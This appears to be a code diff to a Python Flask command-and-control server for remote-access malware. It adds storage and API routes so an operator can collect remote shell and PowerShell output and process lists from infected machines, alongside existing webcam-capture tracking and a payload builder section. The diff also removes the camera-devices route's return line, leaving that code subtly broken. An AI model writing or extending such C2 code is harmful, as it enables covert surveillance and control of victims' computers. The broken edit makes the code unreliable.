@@ -24,6 +24,10 @@ camera_frames = {}
 camera_frames_lock = threading.Lock()
 camera_devices = {}
 camera_devices_lock = threading.Lock()
+terminal_results = {}
+terminal_results_lock = threading.Lock()
+tasklist_results = {}
+tasklist_results_lock = threading.Lock()
 
 # WebSocket connected clients: client_id -> {ws, hostname, username, ip, user_id}
 ws_clients = {}
@@ -870,6 +874,14 @@ def c2_websocket(ws):
                 with camera_devices_lock:
                     camera_devices[client_id] = msg.get('devices', [])
                 continue
+            if msg.get('type') in ('cmd_res', 'ps_res'):
+                with terminal_results_lock:
+                    terminal_results[client_id] = msg.get('output', '')
+                continue
+            if msg.get('type') == 'tasklist_res':
+                with tasklist_results_lock:
+                    tasklist_results[client_id] = msg.get('tasks', [])
+                continue
             with get_db() as db:
                 db.execute('UPDATE clients SET last_heartbeat = CURRENT_TIMESTAMP WHERE client_id = ?', (client_id,))
                 db.commit()
@@ -1017,7 +1029,20 @@ def c2_get_camera_devices(client_id):
             except Exception:
                 pass
         return jsonify([])
-    return jsonify(devices)
+@app.route('/api/c2/terminal_result/<client_id>')
+@login_required
+def c2_get_terminal_result(client_id):
+    with terminal_results_lock:
+        res = terminal_results.pop(client_id, None)
+    return jsonify({'output': res})
+
+
+@app.route('/api/c2/tasklist/<client_id>')
+@login_required
+def c2_get_tasklist(client_id):
+    with tasklist_results_lock:
+        tasks = tasklist_results.pop(client_id, None)
+    return jsonify({'tasks': tasks})
 
 
 # ===== BUILDER =====
